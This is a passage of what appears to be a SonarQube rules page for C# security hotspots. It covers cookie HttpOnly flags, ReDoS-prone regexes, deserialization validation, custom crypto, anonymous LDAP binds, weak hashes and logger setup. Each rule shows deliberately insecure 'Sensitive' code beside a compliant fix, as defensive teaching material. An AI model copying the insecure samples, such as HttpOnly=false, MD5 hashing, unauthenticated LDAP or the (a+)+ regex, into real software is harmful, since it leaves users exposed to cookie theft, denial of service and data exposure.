the theft of session-cookies, the <code>HttpOnly</code> attribute can help to reduce their impact as it won’t be possible to exploit the XSS
vulnerability to steal session-cookies.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> the cookie is sensitive, used to authenticate the user, for instance a <em>session-cookie</em> </li><li> the <code>HttpOnly</code> attribute offer an additional protection (not the case for an <em>XSRF-TOKEN cookie</em> / CSRF token for example)
  </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> By default the <code>HttpOnly</code> flag should be set to <em>true</em> for most of the cookies and it’s mandatory for session /
  sensitive-security cookies. </li></ul>
<h2>Sensitive Code Example</h2>
<p>When the <code>HttpCookie.HttpOnly</code> property is set to <code>false</code> then the cookie can be accessed by client side code:</p>
<pre>
HttpCookie myCookie &#61; new HttpCookie(&#34;Sensitive cookie&#34;);
myCookie.HttpOnly &#61; false; // Sensitive: this cookie is created with the httponly flag set to false and so it can be stolen easily in case of XSS vulnerability
</pre>
<p>The <a href="https://docs.microsoft.com/en-us/dotnet/api/system.web.httpcookie.httponly?view&#61;netframework-4.8" rel="nofollow">default value</a> of
<code>HttpOnly</code> flag is <code>false</code>, unless overwritten by an application’s configuration file:</p>
<pre>
HttpCookie myCookie &#61; new HttpCookie(&#34;Sensitive cookie&#34;);
// Sensitive: this cookie is created without the httponly flag  (by default set to false) and so it can be stolen easily in case of XSS vulnerability
</pre>
<h2>Compliant Solution</h2>
<p>Set the <code>HttpCookie.HttpOnly</code> property to <code>true</code>:</p>
<pre>
HttpCookie myCookie &#61; new HttpCookie(&#34;Sensitive cookie&#34;);
myCookie.HttpOnly &#61; true; // Compliant: the sensitive cookie is protected against theft thanks to the HttpOnly property set to true (HttpOnly &#61; true)
</pre>
<p>Or change the default flag values for the whole application by editing the <a href="https://docs.microsoft.com/en-us/previous-versions/dotnet/netframework-4.0/ms228262%28v&#61;vs.100%29" rel="nofollow">Web.config configuration file</a>:</p>
<pre>
&lt;httpCookies httpOnlyCookies&#61;&#34;true&#34; requireSSL&#61;&#34;true&#34; /&gt;
</pre>
<ul><li> the <code>requireSSL</code> attribute corresponds programmatically to the <code>Secure</code> field. </li><li> the <code>httpOnlyCookies</code> attribute corresponds programmatically to the <code>httpOnly</code> field. </li></ul>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-community/HttpOnly" rel="nofollow">OWASP HttpOnly</a> </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_%28XSS%29" rel="nofollow">OWASP Top 10 2017 Category A7</a> - Cross-Site
  Scripting (XSS) </li><li> <a href="https://cwe.mitre.org/data/definitions/1004" rel="nofollow">MITRE, CWE-1004</a> - Sensitive Cookie Without &#39;HttpOnly&#39; Flag </li><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS Top 25</a> - Insecure Interaction Between Components </li><li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#HTTPONLY_COOKIE" rel="nofollow">HTTPONLY_COOKIE</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S4784">
              csharpsquid:S4784
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href="/organizations/treble-tech/rules?open&#61;roslyn.sonaranalyzer.security.cs%3AS2631&amp;rule_key&#61;roslyn.sonaranalyzer.security.cs%3AS2631" rel="nofollow">S2631</a> instead.</p>
<p>Using regular expressions is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2017-16021" rel="nofollow">CVE-2017-16021</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-13863" rel="nofollow">CVE-2018-13863</a> </li></ul>
<p>Evaluating regular expressions against input strings is potentially an extremely CPU-intensive task. Specially crafted regular expressions such as
<code>(a&#43;)&#43;s</code> will take several seconds to evaluate the input string <code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaabs</code>. The problem is that with
every additional <code>a</code> character added to the input, the time required to evaluate the regex doubles. However, the equivalent regular
expression, <code>a&#43;s</code> (without grouping) is efficiently evaluated in milliseconds and scales linearly with the input size.</p>
<p>Evaluating such regular expressions opens the door to <a href="https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS" rel="nofollow">Regular expression Denial of Service (ReDoS)</a> attacks.
In the context of a web application, attackers can force the web server to spend all of its resources evaluating regular expressions thereby making
the service inaccessible to genuine users.</p>
<p>This rule flags any execution of a hardcoded regular expression which has at least 3 characters and at least two instances of any of the following
characters: <code>*&#43;{<!-- --></code>.</p>
<p>Example: <code>(a&#43;)*</code></p>
<h2>Ask Yourself Whether</h2>
<ul><li> the executed regular expression is sensitive and a user can provide a string which will be analyzed by this regular expression. </li><li> your regular expression engine performance decrease with specially crafted inputs and regular expressions. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Check whether your regular expression engine (the algorithm executing your regular expression) has any known vulnerabilities. Search for
vulnerability reports mentioning the one engine you’re are using.</p>
<p>If the regular expression is vulnerable to ReDos attacks, mitigate the risk by using a &#34;match timeout&#34; to limit the time spent running the regular
expression.</p>
<p>Remember also that a ReDos attack is possible if a user-provided regular expression is executed. This rule won’t detect this kind of injection.</p>
<h2>Sensitive Code Example</h2>
<pre>
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.Serialization;
using System.Text.RegularExpressions;
using System.Web;

namespace N
{
    public class RegularExpression
    {
        void Foo(RegexOptions options, TimeSpan matchTimeout, string input,
                 string replacement, MatchEvaluator evaluator)
        {
            // All the following instantiations are Sensitive.
            new System.Text.RegularExpressions.Regex(&#34;(a&#43;)&#43;&#34;);
            new System.Text.RegularExpressions.Regex(&#34;(a&#43;)&#43;&#34;, options);
            new System.Text.RegularExpressions.Regex(&#34;(a&#43;)&#43;&#34;, options, matchTimeout);

            // All the following static methods are Sensitive.
            System.Text.RegularExpressions.Regex.IsMatch(input, &#34;(a&#43;)&#43;&#34;);
            System.Text.RegularExpressions.Regex.IsMatch(input, &#34;(a&#43;)&#43;&#34;, options);
            System.Text.RegularExpressions.Regex.IsMatch(input, &#34;(a&#43;)&#43;&#34;, options, matchTimeout);

            System.Text.RegularExpressions.Regex.Match(input, &#34;(a&#43;)&#43;&#34;);
            System.Text.RegularExpressions.Regex.Match(input, &#34;(a&#43;)&#43;&#34;, options);
            System.Text.RegularExpressions.Regex.Match(input, &#34;(a&#43;)&#43;&#34;, options, matchTimeout);

            System.Text.RegularExpressions.Regex.Matches(input, &#34;(a&#43;)&#43;&#34;);
            System.Text.RegularExpressions.Regex.Matches(input, &#34;(a&#43;)&#43;&#34;, options);
            System.Text.RegularExpressions.Regex.Matches(input, &#34;(a&#43;)&#43;&#34;, options, matchTimeout);

            System.Text.RegularExpressions.Regex.Replace(input, &#34;(a&#43;)&#43;&#34;, evaluator);
            System.Text.RegularExpressions.Regex.Replace(input, &#34;(a&#43;)&#43;&#34;, evaluator, options);
            System.Text.RegularExpressions.Regex.Replace(input, &#34;(a&#43;)&#43;&#34;, evaluator, options, matchTimeout);
            System.Text.RegularExpressions.Regex.Replace(input, &#34;(a&#43;)&#43;&#34;, replacement);
            System.Text.RegularExpressions.Regex.Replace(input, &#34;(a&#43;)&#43;&#34;, replacement, options);
            System.Text.RegularExpressions.Regex.Replace(input, &#34;(a&#43;)&#43;&#34;, replacement, options, matchTimeout);

            System.Text.RegularExpressions.Regex.Split(input, &#34;(a&#43;)&#43;&#34;);
            System.Text.RegularExpressions.Regex.Split(input, &#34;(a&#43;)&#43;&#34;, options);
            System.Text.RegularExpressions.Regex.Split(input, &#34;(a&#43;)&#43;&#34;, options, matchTimeout);
        }
    }
}
</pre>
<h2>Exceptions</h2>
<p>Some corner-case regular expressions will not raise an issue even though they might be vulnerable. For example: <code>(a|aa)&#43;</code>,
<code>(a|a?)&#43;</code>.</p>
<p>It is a good idea to test your regular expression if it has the same pattern on both side of a &#34;<code>|</code>&#34;.</p>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS" rel="nofollow">MITRE, CWE-624</a> - Executable Regular
  Expression Error </li><li> OWASP Regular expression Denial of Service - ReDoS </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S5766">
              csharpsquid:S5766
            </a>
          </td>
          <td>
            <details>
              <p>Deserialization process extracts data from the serialized representation of an object and reconstruct it directly, without calling constructors.
Thus, data validation implemented in constructors can be bypassed if serialized objects are controlled by an attacker.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The data validation implemented in constructors enforces a relevant security check. </li><li> Objects instantiated via deserialization don’t run the same security checks as the ones executed when objects are created through constructors.
  </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> At the end of the deserialization process it is recommended to perform the same validation checks as the ones performed in constructors,
  especially when the serialized object can be controlled by an attacker. </li></ul>
<h2>Sensitive Code Example</h2>
<p>When a <code>serializable</code> class doesn’t inherit from <a href="https://docs.microsoft.com/en-us/dotnet/api/system.runtime.serialization.iserializable?view&#61;netframework-4.8" rel="nofollow">ISerializable</a> or <a href="https://docs.microsoft.com/fr-fr/dotnet/api/system.runtime.serialization.ideserializationcallback?view&#61;netframework-4.8" rel="nofollow">IDeserializationCallback</a>
types and has a constructor using its parameters in conditions:</p>
<pre>
[Serializable]
public class InternalUrl
{
    private string url;

    public InternalUrl(string tmpUrl) // Sensitive
    {
       if(!tmpUrl.StartsWith(&#34;http://localhost/&#34;)) // there is some input validation
       {
          url&#61; &#34;http://localhost/default&#34;;
       }
       else
       {
          url&#61; tmpUrl;
       }
    }
}
</pre>
<p>When a class inherit from <a href="https://docs.microsoft.com/en-us/dotnet/api/system.runtime.serialization.iserializable?view&#61;netframework-4.8" rel="nofollow">ISerializable</a> type, has a
regular constructor using its parameters in conditions, but doesn’t perform the same validation after deserialization:</p>
<pre>
[Serializable]
public class InternalUrl : ISerializable
{
    private string url;

    public InternalUrl(string tmpUrl) // Sensitive
    {
        if(!tmpUrl.StartsWith(&#34;http://localhost/&#34;)) // there is some input validation
        {
            url&#61; &#34;http://localhost/default&#34;;
        }
        else
        {
            url&#61; tmpUrl;
        }
    }

    // special constructor used during deserialization
    protected InternalUrl(SerializationInfo info, StreamingContext context) // Sensitive
    {
       url&#61; (string) info.GetValue(&#34;url&#34;, typeof(string));
       // the same validation as seen in the regular constructor is not performed
     }

    void ISerializable.GetObjectData(SerializationInfo info, StreamingContext context)
    {
        info.AddValue(&#34;url&#34;, url);
    }
}
</pre>
<p>When a class inherit from <a href="https://docs.microsoft.com/fr-fr/dotnet/api/system.runtime.serialization.ideserializationcallback?view&#61;netframework-4.8" rel="nofollow">IDeserializationCallback</a>
type, has a constructor using its parameters in conditions but the <code>IDeserializationCallback.OnDeserialization</code> method doesn’t perform any
conditional checks:</p>
<pre>
[Serializable]
public class InternalUrl : IDeserializationCallback
{
    private string url;

    public InternalUrl(string tmpUrl) // Sensitive
    {
        if(!tmpUrl.StartsWith(&#34;http://localhost/&#34;)) // there is some input validation
        {
            url&#61; &#34;http://localhost/default&#34;;
        }
        else
        {
            url&#61; tmpUrl;
        }
    }

    void IDeserializationCallback.OnDeserialization(object sender) // Sensitive
    {
       // the same validation as seen in the constructor is not performed
    }
}
</pre>
<h2>Compliant Solution</h2>
<p>When using <a href="https://docs.microsoft.com/en-us/dotnet/api/system.runtime.serialization.iserializable?view&#61;netframework-4.8" rel="nofollow">ISerializable</a>
type to control deserialization, perform the same checks inside regular constructors than in the special constructor <code>SerializationInfo info,
StreamingContext context</code> used during deserialization:</p>
<pre>
[Serializable]
public class InternalUrl : ISerializable
{
    private string url;

    public InternalUrl(string tmpUrl)
    {
        if(!tmpUrl.StartsWith(&#34;http://localhost/&#34;)) // there is some input validation
        {
            url&#61; &#34;http://localhost/default&#34;;
        }
        else
        {
            url&#61; tmpUrl;
        }
    }

    // special constructor used during deserialization
    protected InternalUrl(SerializationInfo info, StreamingContext context)
    {
       string tmpUrl&#61; (string) info.GetValue(&#34;url&#34;, typeof(string));

       if(!tmpUrl.StartsWith(&#34;http://localhost/&#34;) { // Compliant
          url&#61; &#34;http://localhost/default&#34;;
       }
       else {
          url&#61; tmpUrl;
       }
     }

    void ISerializable.GetObjectData(SerializationInfo info, StreamingContext context)
    {
        info.AddValue(&#34;url&#34;, url);
    }
}
</pre>
<p>When using <a href="https://docs.microsoft.com/fr-fr/dotnet/api/system.runtime.serialization.ideserializationcallback?view&#61;netframework-4.8" rel="nofollow">IDeserializationCallback</a>
type to control deserialization, perform the same checks inside regular constructors than after deserialization with
<code>IDeserializationCallback.OnDeserialization</code> method:</p>
<pre>
[Serializable]
public class InternalUrl : IDeserializationCallback
{
    private string url;

    public InternalUrl(string tmpUrl)
    {
       if(!tmpUrl.StartsWith(&#34;http://localhost/&#34;)) // there is some input validation
       {
          url&#61; &#34;http://localhost/default&#34;;
       }
       else
       {
          url&#61; tmpUrl;
       }
    }

    void IDeserializationCallback.OnDeserialization(object sender) // Compliant
    {
        if(!url.StartsWith(&#34;http://localhost/&#34;))
        {
            url&#61; &#34;http://localhost/default&#34;;
        }
        else
        {
        }
    }
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/" rel="nofollow">OWASP Top 10 2021 Category A8</a> - Software and Data
  Integrity Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization" rel="nofollow">OWASP Top 10 2017 Category A8</a> - Insecure
  Deserialization </li><li> <a href="https://docs.microsoft.com/en-us/dotnet/framework/misc/security-and-serialization" rel="nofollow">docs.microsoft.com</a> - security-and-serialization
  </li><li> <a href="https://cwe.mitre.org/data/definitions/502" rel="nofollow">MITRE, CWE-502</a> - Deserialization of Untrusted Data </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S2257">
              csharpsquid:S2257
            </a>
          </td>
          <td>
            <details>
              <p>The use of a non-standard algorithm is dangerous because a determined attacker may be able to break the algorithm and compromise whatever data has
been protected. Standard algorithms like <code>AES</code>, <code>RSA</code>, <code>SHA</code>, …​ should be used instead.</p>
<p>This rule tracks custom implementation of these types from <code>System.Security.Cryptography</code> namespace:</p>
<ul><li> <code>AsymmetricAlgorithm</code> </li><li> <code>AsymmetricKeyExchangeDeformatter</code> </li><li> <code>AsymmetricKeyExchangeFormatter</code> </li><li> <code>AsymmetricSignatureDeformatter</code> </li><li> <code>AsymmetricSignatureFormatter</code> </li><li> <code>DeriveBytes</code> </li><li> <code>HashAlgorithm</code> </li><li> <code>ICryptoTransform</code> </li><li> <code>SymmetricAlgorithm</code> </li></ul>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Use a standard algorithm instead of creating a custom one. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
public class CustomHash : HashAlgorithm // Noncompliant
{
    private byte[] result;

    public override void Initialize() &#61;&gt; result &#61; null;
    protected override byte[] HashFinal() &#61;&gt; result;

    protected override void HashCore(byte[] array, int ibStart, int cbSize) &#61;&gt;
        result ??&#61; array.Take(8).ToArray();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
SHA256 mySHA256 &#61; SHA256.Create()
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li><li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#CUSTOM_MESSAGE_DIGEST" rel="nofollow">MessageDigest is Custom</a>
  </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S4433">
              csharpsquid:S4433
            </a>
          </td>
          <td>
            <details>
              <p>Lightweight Directory Access Protocol (LDAP) servers provide two main authentication methods: the <em>SASL</em> and <em>Simple</em> ones. The
<em>Simple Authentication</em> method also breaks down into three different mechanisms:</p>
<ul><li> <em>Anonymous</em> Authentication </li><li> <em>Unauthenticated</em> Authentication </li><li> <em>Name/Password</em> Authentication </li></ul>
<p>A server that accepts either the <em>Anonymous</em> or <em>Unauthenticated</em> mechanisms will accept connections from clients not providing
credentials.</p>
<h2>Why is this an issue?</h2>
<p>When configured to accept the Anonymous or Unauthenticated authentication mechanism, an LDAP server will accept connections from clients that do
not provide a password or other authentication credentials. Such users will be able to read or modify part or all of the data contained in the hosted
directory.</p>
<h3>What is the potential impact?</h3>
<p>An attacker exploiting unauthenticated access to an LDAP server can access the data that is stored in the corresponding directory. The impact
varies depending on the permission obtained on the directory and the type of data it stores.</p>
<h4>Authentication bypass</h4>
<p>If attackers get write access to the directory, they will be able to alter most of the data it stores. This might include sensitive technical data
such as user passwords or asset configurations. Such an attack can typically lead to an authentication bypass on applications and systems that use the
affected directory as an identity provider.</p>
<p>In such a case, all users configured in the directory might see their identity and privileges taken over.</p>
<h4>Sensitive information leak</h4>
<p>If attackers get read-only access to the directory, they will be able to read the data it stores. That data might include security-sensitive pieces
of information.</p>
<p>Typically, attackers might get access to user account lists that they can use in further intrusion steps. For example, they could use such lists to
perform password spraying, or related attacks, on all systems that rely on the affected directory as an identity provider.</p>
<p>If the directory contains some Personally Identifiable Information, an attacker accessing it might represent a violation of regulatory requirements
in some countries. For example, this kind of security event would go against the European GDPR law.</p>
<h2>How to fix it</h2>
<h3>Code examples</h3>
<p>The following code indicates an anonymous LDAP authentication vulnerability because it binds to a remote server using an Anonymous Simple
authentication mechanism.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
DirectoryEntry myDirectoryEntry &#61; new DirectoryEntry(adPath);
myDirectoryEntry.AuthenticationType &#61; AuthenticationTypes.None; // Noncompliant

DirectoryEntry myDirectoryEntry &#61; new DirectoryEntry(adPath, &#34;u&#34;, &#34;p&#34;, AuthenticationTypes.None); // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
DirectoryEntry myDirectoryEntry &#61; new DirectoryEntry(myADSPath); // Compliant; default DirectoryEntry.AuthenticationType property value is &#34;Secure&#34; since .NET Framework 2.0

DirectoryEntry myDirectoryEntry &#61; new DirectoryEntry(myADSPath, &#34;u&#34;, &#34;p&#34;, AuthenticationTypes.Secure);
</pre>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul><li> <a href="https://datatracker.ietf.org/doc/html/rfc4513#section-5" rel="nofollow">RFC 4513 - Lightweight Directory Access Protocol (LDAP): Authentication
  Methods and Security Mechanisms</a> - Bind operations </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication" rel="nofollow">OWASP Top 10 2017 Category A2</a> - Broken Authentication
  </li><li> <a href="https://cwe.mitre.org/data/definitions/521" rel="nofollow">MITRE, CWE-521</a> - Weak Password Requirements </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S4790">
              csharpsquid:S4790
            </a>
          </td>
          <td>
            <details>
              <p>Cryptographic hash algorithms such as <code>MD2</code>, <code>MD4</code>, <code>MD5</code>, <code>MD6</code>, <code>HAVAL-128</code>,
<code>HMAC-MD5</code>, <code>DSA</code> (which uses <code>SHA-1</code>), <code>RIPEMD</code>, <code>RIPEMD-128</code>, <code>RIPEMD-160</code>,
<code>HMACRIPEMD160</code> and <code>SHA-1</code> are no longer considered secure, because it is possible to have <code>collisions</code> (little
computational effort is enough to find two or more different inputs that produce the same hash).</p>
<h2>Ask Yourself Whether</h2>
<p>The hashed value is used in a security context like:</p>
<ul><li> User-password storage. </li><li> Security token generation (used to confirm e-mail when registering on a website, reset password, etc …​). </li><li> To compute some message integrity. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Safer alternatives, such as <code>SHA-256</code>, <code>SHA-512</code>, <code>SHA-3</code> are recommended, and for password hashing, it’s even
better to use algorithms that do not compute too &#34;quickly&#34;, like <code>bcrypt</code>, <code>scrypt</code>, <code>argon2</code> or <code>pbkdf2</code>
because it slows down <code>brute force attacks</code>.</p>
<h2>Sensitive Code Example</h2>
<pre>
var hashProvider1 &#61; new MD5CryptoServiceProvider(); // Sensitive
var hashProvider2 &#61; (HashAlgorithm)CryptoConfig.CreateFromName(&#34;MD5&#34;); // Sensitive
var hashProvider3 &#61; new SHA1Managed(); // Sensitive
var hashProvider4 &#61; HashAlgorithm.Create(&#34;SHA1&#34;); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
var hashProvider1 &#61; new SHA512Managed(); // Compliant
var hashProvider2 &#61; (HashAlgorithm)CryptoConfig.CreateFromName(&#34;SHA512Managed&#34;); // Compliant
var hashProvider3 &#61; HashAlgorithm.Create(&#34;SHA512Managed&#34;); // Compliant
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements" rel="nofollow">Mobile AppSec
  Verification Standard</a> - Cryptography Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography" rel="nofollow">OWASP Mobile Top 10 2016 Category M5</a> -
  Insufficient Cryptography </li><li> <a href="https://cwe.mitre.org/data/definitions/1240" rel="nofollow">MITRE, CWE-1240</a> - Use of a Risky Cryptographic Primitive </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S4792">
              csharpsquid:S4792
            </a>
          </td>
          <td>
            <details>
              <p>Configuring loggers is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-0285" rel="nofollow">CVE-2018-0285</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2000-1127" rel="nofollow">CVE-2000-1127</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2017-15113" rel="nofollow">CVE-2017-15113</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2015-5742" rel="nofollow">CVE-2015-5742</a> </li></ul>
<p>Logs are useful before, during and after a security incident.</p>
<ul><li> Attackers will most of the time start their nefarious work by probing the system for vulnerabilities. Monitoring this activity and stopping it
  is the first step to prevent an attack from ever happening. </li><li> In case of a successful attack, logs should contain enough information to understand what damage an attacker may have inflicted. </li></ul>
<p>Logs are also a target for attackers because they might contain sensitive information. Configuring loggers has an impact on the type of information
logged and how they are logged.</p>
<p>This rule flags for review code that initiates loggers configuration. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> unauthorized users might have access to the logs, either because they are stored in an insecure location or because the application gives
  access to them. </li><li> the logs contain sensitive information on a production server. This can happen when the logger is in debug mode. </li><li> the log can grow without limit. This can happen when additional information is written into logs every time a user performs an action and the
  user can perform the action as many times as he/she wants. </li><li> the logs do not contain enough information to understand the damage an attacker might have inflicted. The loggers mode (info, warn, error)
  might filter out important information. They might not print contextual information like the precise time of events or the server hostname. </li><li> the logs are only stored locally instead of being backuped or replicated. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Check that your production deployment doesn’t have its loggers in &#34;debug&#34; mode as it might write sensitive information in logs. </li><li> Production logs should be stored in a secure location which is only accessible to system administrators. </li><li> Configure the loggers to display all warnings, info and error messages. Write relevant information such as the precise time of events and the
  hostname. </li><li> Choose log format which is easy to parse and process automatically. It is important to process logs rapidly in case of an attack so that the
  impact is known and limited. </li><li> Check that the permissions of the log files are correct. If you index the logs in some other service, make sure that the transfer and the
  service are secure too. </li><li> Add limits to the size of the logs and make sure that no user can fill the disk with logs. This can happen even when the user does not control
  the logged information. An attacker could just repeat a logged action many times. </li></ul>
<p>Remember that configuring loggers properly doesn’t make them bullet-proof. Here is a list of recommendations explaining on how to use your
logs:</p>
<ul><li> Don’t log any sensitive information. This obviously includes passwords and credit card numbers but also any personal information such as user
  names, locations, etc…​ Usually any information which is protected by law is good candidate for removal. </li><li> Sanitize all user inputs before writing them in the logs. This includes checking its size, content, encoding, syntax, etc…​ As for any user
  input, validate using whitelists whenever possible. Enabling users to write what they want in your logs can have many impacts. It could for example
  use all your storage space or compromise your log indexing service. </li><li> Log enough information to monitor suspicious activities and evaluate the impact an attacker might have on your systems. Register events such as
  failed logins, successful logins, server side input validation failures, access denials and any important transaction. </li><li> Monitor the logs for any suspicious activity. </li></ul>
<h2>Sensitive Code Example</h2>
<p><strong>.Net Core</strong>: configure programmatically</p>
<pre>
using System;
using System.Collections;
using System.Collections.Generic;
using Microsoft.AspNetCore.Builder;
using Microsoft.AspNetCore.Hosting;
using Microsoft.Extensions.Configuration;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Logging;
using Microsoft.Extensions.Options;
using Microsoft.AspNetCore;

namespace MvcApp
{
    public class ProgramLogging
    {
        public static IWebHostBuilder CreateWebHostBuilder(string[] args) &#61;&gt;
            WebHost.CreateDefaultBuilder(args)
                .ConfigureLogging((hostingContext, logging) &#61;&gt; // Sensitive
                {
                    // ...
                })
                .UseStartup&lt;StartupLogging&gt;();
    }

    public class StartupLogging
    {
        public void ConfigureServices(IServiceCollection services)
        {
            services.AddLogging(logging &#61;&gt; // Sensitive
            {
                // ...
            });
        }

        public void Configure(IApplicationBuilder app, IHostingEnvironment env, ILoggerFactory loggerFactory)
        {
            IConfiguration config &#61; null;
            LogLevel level &#61; LogLevel.Critical;
            Boolean includeScopes &#61; false;
            Func&lt;string,Microsoft.Extensions.Logging.LogLevel,bool&gt; filter &#61; null;
            Microsoft.Extensions.Logging.Console.IConsoleLoggerSettings consoleSettings &#61; null;
            Microsoft.Extensions.Logging.AzureAppServices.AzureAppServicesDiagnosticsSettings azureSettings &#61; null;
            Microsoft.Extensions.Logging.EventLog.EventLogSettings eventLogSettings &#61; null;

            // An issue will be raised for each call to an ILoggerFactory extension methods adding loggers.
            loggerFactory.AddAzureWebAppDiagnostics(); // Sensitive
            loggerFactory.AddAzureWebAppDiagnostics(azureSettings); // Sensitive
            loggerFactory.AddConsole(); // Sensitive
            loggerFactory.AddConsole(level); // Sensitive
            loggerFactory.AddConsole(level, includeScopes); // Sensitive
            loggerFactory.AddConsole(filter); // Sensitive
            loggerFactory.AddConsole(filter, includeScopes); // Sensitive
            loggerFactory.AddConsole(config); // Sensitive
            loggerFactory.AddConsole(consoleSettings); // Sensitive
            loggerFactory.AddDebug(); // Sensitive
            loggerFactory.AddDebug(level); // Sensitive
            loggerFactory.AddDebug(filter); // Sensitive
            loggerFactory.AddEventLog(); // Sensitive
            loggerFactory.AddEventLog(eventLogSettings); // Sensitive
            loggerFactory.AddEventLog(level); // Sensitive
            loggerFactory.AddEventSourceLogger(); // Sensitive

            IEnumerable&lt;ILoggerProvider&gt; providers &#61; null;
            LoggerFilterOptions filterOptions1 &#61; null;
            IOptionsMonitor&lt;LoggerFilterOptions&gt; filterOptions2 &#61; null;

            LoggerFactory factory &#61; new LoggerFactory(); // Sensitive
            new LoggerFactory(providers); // Sensitive
            new LoggerFactory(providers, filterOptions1); // Sensitive
            new LoggerFactory(providers, filterOptions2); // Sensitive
        }
    }
}
</pre>
<p><strong>Log4Net</strong></p>
<pre>
using System;
using System.IO;
using System.Xml;
using log4net.Appender;
using log4net.Config;
using log4net.Repository;

namespace Logging
{
    class Log4netLogging
    {
        void Foo(ILoggerRepository repository, XmlElement element, FileInfo configFile, Uri configUri, Stream configStream,
        IAppender appender, params IAppender[] appenders) {
            log4net.Config.XmlConfigurator.Configure(repository); // Sensitive
